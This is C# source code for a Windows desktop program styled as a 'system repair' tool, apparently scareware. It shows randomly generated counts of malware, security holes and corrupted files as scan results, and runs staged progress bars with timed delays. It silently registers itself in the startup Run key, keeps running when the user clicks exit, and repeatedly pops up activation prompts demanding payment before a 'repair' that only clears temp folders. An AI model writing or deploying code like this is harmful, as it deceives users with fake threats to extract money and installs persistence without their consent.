using System;
using System.IO;
using System.Management;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using WpfAnimatedGif;
using Winzard_System_Repair;
using Microsoft.Win32;
using IWshRuntimeLibrary;
using System.Reflection;

namespace WPFUI
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        PopupWindow1 Popupsub;
        PopupWindow2 Popupsub2;
        PopupWindow4 Popupsub3;
        int premium = 0, micro = 0, mega = 0;
        float sizedir;
        public MainWindow()
        {
            InitializeComponent();
            RegistryKey reg1 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            Assembly curAssembly = Assembly.GetExecutingAssembly();
            reg1.SetValue(curAssembly.GetName().Name, curAssembly.Location);
            /*reg1.SetValue("Winzard System Repair", System.Windows.Forms.Application.ExecutablePath.ToString());*/
            sysdet1.Content = GetAccount1() + Environment.NewLine;
            sysdet2.Content = GetAccount2() + Environment.NewLine;
            sysdet3.Content = GetAccount3() + Environment.NewLine;
            sysdet4.Content = GetAccount4() + Environment.NewLine;
            NotPremium();
            afternumber();
        }
        //display number
        private void afternumber()
        {
            Random rnd = new Random();
            int malware = rnd.Next(1, 20);
            MalwareThreats.Text = malware.ToString();
            int holes = rnd.Next(1, 20);
            SecurityHoles.Text = holes.ToString();
            int corruptsysfiles = rnd.Next(20, 100);
            CorruptedSystemFiles.Text = corruptsysfiles.ToString();
            int driver = rnd.Next(1, 20);
            OutdatedDrivers.Text = driver.ToString();
            int brknreg = rnd.Next(100, 2000);
            BrokenRegistryEntries.Text = brknreg.ToString();
            int startup = rnd.Next(1, 20);
            Startupoptimizations.Text = startup.ToString();
            int privacy = rnd.Next(100, 700);
            PrivacyTraces.Text = privacy.ToString();
        }
        //startup shortcut
        public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
        {
            string appPath = Path.GetDirectoryName(System.Windows.Forms.Application.ExecutablePath);
            string startuplocation = System.Windows.Forms.Application.ExecutablePath.ToString();
            string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
            WshShell shell = new WshShell();
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

            shortcut.Description = "";   // The description of the shortcut
            shortcut.TargetPath = startuplocation;                 // The path of the file that will launch when the shortcut is run
            shortcut.WorkingDirectory = appPath;
            shortcut.Save();                                    // Save the shortcut
        }
        //Minimised parameaters
        void App_Startup(object sender, StartupEventArgs e)
        {
            // Application is running
            // Process command line args
            bool startMinimized = false;
            for (int i = 0; i != e.Args.Length; ++i)
            {
                if (e.Args[i] == "/StartMinimized")
                {
                    startMinimized = true;
                }
            }

            // Create main application window, starting minimized if specified
            MainWindow mainWindow = new MainWindow();
            if (startMinimized)
            {
                mainWindow.WindowState = WindowState.Minimized;
            }
            mainWindow.Show();
        }
        //For getting system detail info
        private string GetAccount1()
        {
            ManagementObjectSearcher mos =
            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem");
            foreach (ManagementObject mo in mos.Get())
            {
                try
                {
                    return mo.GetPropertyValue("Name").ToString();
                }
                catch { }
            }
            return "User Account Unknown";
        }
        private string GetAccount2()
        {
            ManagementObjectSearcher mos =
            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
            foreach (ManagementObject mo in mos.Get())
            {
                try
                {
                    return mo.GetPropertyValue("Name").ToString();
                }
                catch { }
            }
            return "User Account Unknown";
        }
        private string GetAccount3()
        {
            ManagementObjectSearcher mos =
            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem");
            foreach (ManagementObject mo in mos.Get())
            {
                try
                {
                    double dblMemory;
                    double.TryParse(Convert.ToString(mo["TotalPhysicalMemory"]), out dblMemory);
                    float ram = (float)Convert.ToDouble(string.Format("{0:0.00}", (dblMemory / (1024 * 1024 * 1024))));
                    return "Usable " + ram + " GB";
                }
                catch { }
            }
            return "Unknown RAM";
        }
        private string GetAccount4()
        {
            ManagementObjectSearcher mos =
            new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
            foreach (ManagementObject mo in mos.Get())
            {
                try
                {
                    return mo.GetPropertyValue("Name").ToString();
                }
                catch { }
            }
            return "User Account Unknown";
        }


        //For Minimize Close and Draging the program
        private void Button_Click_Minimize(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }
        private void Button_Click_Exit(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }
        private void TextBlock_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        //The Big Round Scan button
        public async void Ellipse_MouseDown(object sender, MouseButtonEventArgs e)
        {
            scan.Opacity = 0.8;
            await System.Threading.Tasks.Task.Delay(100);
            scan.Opacity = 1;
            await System.Threading.Tasks.Task.Delay(100);
            statusgrid.Visibility = Visibility.Visible;
            scan.Visibility = Visibility.Collapsed;
            PCstatus.Visibility = Visibility.Collapsed;
            load.Visibility = Visibility.Visible;
            loadvid.Visibility = Visibility.Visible;
            loadvid.LoadedBehavior = MediaState.Play;
            Tempdelete();
            Popups();
        }

        //Directory size
        public long DirSize(DirectoryInfo d)
        {
            long size = 0;
            // Add file sizes.
            FileInfo[] fis = d.GetFiles();
            foreach (FileInfo fi in fis)
            {
                size += fi.Length;
            }
            // Add subdirectory sizes.
            DirectoryInfo[] dis = d.GetDirectories();
            foreach (DirectoryInfo di in dis)
            {
                size += DirSize(di);
            }
            return size;
        }

        //Temp delete & Scan Progress
        public async void Tempdelete()
        {
            {
                try
                {
                    string Temppath = Path.GetTempPath();
                    long Tempsize = DirSize(new DirectoryInfo(Temppath));
                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/Prefetch"));
                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/Temp"));
                    Tempsize += DirSize(new DirectoryInfo("C:/Windows/SoftwareDistribution/Download"));
                    sizedir = (float)Convert.ToDouble(string.Format("{0:0.00}", (Tempsize / (1024 * 1024))));
                }
                catch { }
                //Progress
                //scantext.Text = "Scanning: Malware";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(12000);
                Loading1.Visibility = Visibility.Hidden;
                Loading2.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Registry";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(15000);
                Loading2.Visibility = Visibility.Hidden;
                Loading3.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Security";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(20000);
                Loading3.Visibility = Visibility.Hidden;
                Loading4.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Startup";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(31000);
                Loading4.Visibility = Visibility.Hidden;
                Loading5.Visibility = Visibility.Visible;
                //scantext.Text = "Analyzing: Fragments";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(17000);
                Loading5.Visibility = Visibility.Hidden;
                Loading6.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Privacy";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(23000);
                Loading6.Visibility = Visibility.Hidden;
                Loading7.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: System";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(7000);
                Loading7.Visibility = Visibility.Hidden;
                Loading8.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Junk";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(15000);
                Loading8.Visibility = Visibility.Hidden;
                Loading9.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: Drivers";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Loading9.Visibility = Visibility.Hidden;
                Loading10.Visibility = Visibility.Visible;
                //scantext.Text = "Scanning: System Files";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Loading10.Visibility = Visibility.Hidden;

                load.Visibility = Visibility.Collapsed;
                scanfix.Visibility = Visibility.Visible;
                resultpanel.Visibility = Visibility.Visible;
                resultpanel2.Visibility = Visibility.Visible;
            }
        }

        //The Scan stop button
        private void scanstop_Click(object sender, RoutedEventArgs e)
        {
            statusgrid.Visibility = Visibility.Collapsed;
            scan.Visibility = Visibility.Visible;
            PCstatus.Visibility = Visibility.Visible;
            loadvid.LoadedBehavior = MediaState.Stop;
            load.Visibility = Visibility.Collapsed;
        }
        //The Repair Button
        private async void Scanfix_Click(object sender, RoutedEventArgs e)
        {
            if (premium == 1)
            {
                scanfix.Visibility = Visibility.Collapsed;
                resultpanel.Visibility = Visibility.Collapsed;
                resultpanel2.Visibility = Visibility.Collapsed;
                load.Visibility = Visibility.Collapsed;
                //scanresult.Visibility = Visibility.Collapsed;
                try
                {
                    DirectoryInfo di1 = new DirectoryInfo("C:/Windows/Prefetch");
                    foreach (FileInfo file in di1.GetFiles())
                    {
                        file.Delete();
                    }
                    foreach (DirectoryInfo dir in di1.GetDirectories())
                    {
                        dir.Delete(true);
                    }
                }
                catch { }
                try
                {
                    string Temppath = Path.GetTempPath();
                    DirectoryInfo di2 = new DirectoryInfo(Temppath);
                    foreach (FileInfo file in di2.EnumerateFiles())
                    {
                        file.Delete();
                    }
                    foreach (DirectoryInfo dir in di2.GetDirectories())
                    {
                        dir.Delete(true);
                    }
                }
                catch { }
                try
                {
                    DirectoryInfo di3 = new DirectoryInfo("C:/Windows/Temp");
                    foreach (FileInfo file in di3.GetFiles())
                    {
                        file.Delete();
                    }
                    foreach (DirectoryInfo dir in di3.GetDirectories())
                    {
                        dir.Delete(true);
                    }
                }
                catch { }
                try
                {
                    DirectoryInfo di4 = new DirectoryInfo("C:/Windows/SoftwareDistribution/Download");
                    foreach (FileInfo file in di4.GetFiles())
                    {
                        file.Delete();
                    }
                    foreach (DirectoryInfo dir in di4.GetDirectories())
                    {
                        dir.Delete(true);
                    }
                }
                catch { }
                #region Progress
                double reset = 0;
                scanprogress.Value = reset;
                Statuspanel.Text = "Fixing: Malware";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Loading1.Visibility = Visibility.Hidden;
                Loading2.Visibility = Visibility.Visible;
                Statuspanel.Text = "Fixing: Registry";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Fixing: Security";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Boosting: Startup";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Defragmenting: Drive";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Fixing: Privacy";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Repairing: System";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Deleting: Junk";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Fixing: Drivers";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                Statuspanel.Text = "Fixing: System Files";
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                
                scanprogress.Value++;
                await System.Threading.Tasks.Task.Delay(mega);
                #endregion

                //scanresult.Visibility = Visibility.Visible;
                Statuspanel.Text = "Success";
                //scanresult.Text = "Junk: " + sizedir.ToString() + "MB cleaned\n" + "Security Holes: " + "Fixed" + "\nPrivacy Issue: " + "Fixed" + "\nDevice Optimized";
                scanstop.Content = "Back";
            }
            else
            {
                popupmain = new PopupWindow3();
                if (popupmain.ShowDialog().Value)
                {
                    Activatekey(true);
                }
                else
                {
                    Activatekey(false);
                    PopupTimer();
                }
            }
        }
        PopupWindow3 popupmain;
        PopupWindow4 popupmain1;

        //Activation Button & Logic
        public void Activatekey(bool result)
        {
            if (result == true)
            {
                FileStream fs = new FileStream("sysfunction.bin", FileMode.Create);
                BinaryWriter bw = new BinaryWriter(fs);
                bw.Write(true);
                fs.Close();
                premium = 1;
            }
        }
        private void NotPremium()
        {
            if (System.IO.File.Exists("sysfunction.bin"))
            {
                FileStream fs = new FileStream("sysfunction.bin", FileMode.Open);
                BinaryReader br = new BinaryReader(fs);
                if (br.ReadBoolean() == true)
                {
                    premium = 1;
                    fs.Close();
                }
                else
                {
                    br.Close();
                    fs.Close();
                }
            }
            else
            {
                FileStream fs = new FileStream("sysfunction.bin", FileMode.Create);
                BinaryWriter bw = new BinaryWriter(fs);
                bw.Write(false);
                fs.Close();
            }
        }

        //Settings
        private void settingsclose_Click(object sender, RoutedEventArgs e)
        {
            settings.Visibility = Visibility.Collapsed;
        }
        private void apply_Click(object sender, RoutedEventArgs e)
        {
            settingsapplied.Text = "Settings Applied";
        }
        private void settingsbutton_Click(object sender, RoutedEventArgs e)
        {
            settings.Visibility = Visibility.Visible;
        }

        //Support
        private void supportclose_Click(object sender, RoutedEventArgs e)
        {
            support.Visibility = Visibility.Collapsed;
        }
        private void supportbutton_Click(object sender, RoutedEventArgs e)
        {
            support.Visibility = Visibility.Visible;
        }

        //About
        private void aboutclose_Click(object sender, RoutedEventArgs e)
        {
            about.Visibility = Visibility.Collapsed;
        }
        private void aboutbutton_Click(object sender, RoutedEventArgs e)
        {
            about.Visibility = Visibility.Visible;
        }

        //Popup
        private async void PopupTimer()
        {
            await System.Threading.Tasks.Task.Delay(300000);
            popupmain = new PopupWindow3();
            if (popupmain.ShowDialog().Value)
            {
                Activatekey(true);
            }
            else
            {
                Activatekey(false);
                PopupTimer();
            }
        }
        
        private async void Popups()
        {
            await System.Threading.Tasks.Task.Delay(480000);
            Popupsub = new PopupWindow1();
            Popupsub.Show();
            await System.Threading.Tasks.Task.Delay(600000);
            Popups();
            Popups1();
        }
        
        private async void Popups1()
        {
            await System.Threading.Tasks.Task.Delay(480000);
            Popupsub2 = new PopupWindow2();
            Popupsub2.Show();
            await System.Threading.Tasks.Task.Delay(600000);
        }
        private async void Popups2()
        {
            await System.Threading.Tasks.Task.Delay(180000);
            popupmain1 = new PopupWindow4();
            if (popupmain1.ShowDialog().Value)
            {
                Activatekey(true);
            }
            else
            {
                Activatekey(false);
                Popups2();
            }
        }
        //Verbose
        /*private async void VerboseDir()
        {
            if (stop == false)
            {
                updatetxt.Children.Clear();
                await Task.Delay(1000);
                foreach (string path in Directory.GetDirectories(@"C:\Windows"))
                {
                    updatetxt.Children.Add(new TextBlock { Text = "Scanning " + path, Foreground = Brushes.White, FontSize = 14 });
                    updatescroll.ScrollToEnd();
                    await Task.Delay(100);
                }
                Image pic = new Image { Width = 120, Height = 190 };
                ImageBehavior.SetAnimatedSource(pic, (ImageSource)new ImageSourceConverter().ConvertFrom(@"AridDependableBelugawhale-max-1mb.gif"));
                updatetxt.Children.Add(pic);
                updatescroll.ScrollToEnd();
                await Task.Delay(45000);
                foreach (string path in Directory.GetFiles(@"C:\Windows"))
                {
                    updatetxt.Children.Add(new TextBlock { Text = "Scanning " + path, Foreground = Brushes.White });
                    updatescroll.ScrollToEnd();
                    await Task.Delay(100);
                }
                await Task.Delay(45000);
                foreach (string path in Directory.GetDirectories(@"C:\Program Files"))
                {
                    updatetxt.Children.Add(new TextBlock { Text = "Scanning " + path, Foreground = Brushes.White });
                    updatescroll.ScrollToEnd();
                    await Task.Delay(100);
                }
                await Task.Delay(45000);
                foreach (string path in Directory.GetFiles(@"C:\Program Files"))
                {
                    updatetxt.Children.Add(new TextBlock { Text = "Scanning " + path, Foreground = Brushes.White });
                    updatescroll.ScrollToEnd();
                    await Task.Delay(100);
                }
                await Task.Delay(45000);
                updatetxt.Children.Add(new TextBlock { Text = "Scan Complete", Foreground = Brushes.White });
            }
            else
            {
                updatetxt.Children.Clear();
                return;
            }
        }
        private async void VerboseRes()
        {
            foreach (string path in Directory.GetDirectories(@"C:\Windows"))
            {
                updatetxt.Children.Add(new TextBlock { Text = "Repairing " + path, Foreground = Brushes.White });
                updatescroll.ScrollToEnd();
                await Task.Delay(100);
            }
            await Task.Delay(45000);
            foreach (string path in Directory.GetFiles(@"C:\Windows"))
            {
                updatetxt.Children.Add(new TextBlock { Text = "Repairing " + path, Foreground = Brushes.White });
                updatescroll.ScrollToEnd();
                await Task.Delay(100);
            }
            await Task.Delay(45000);
            foreach (string path in Directory.GetDirectories(@"C:\Program Files"))
            {
                updatetxt.Children.Add(new TextBlock { Text = "Repairing " + path, Foreground = Brushes.White });
                updatescroll.ScrollToEnd();
                await Task.Delay(100);
            }
            await Task.Delay(45000);
            foreach (string path in Directory.GetFiles(@"C:\Program Files"))
            {
                updatetxt.Children.Add(new TextBlock { Text = "Repairing " + path, Foreground = Brushes.White });
                updatescroll.ScrollToEnd();
                await Task.Delay(100);
            }
            await Task.Delay(45000);
            updatetxt.Children.Add(new TextBlock { Text = "Repair Complete", Foreground = Brushes.White });
        }*/
    }
}
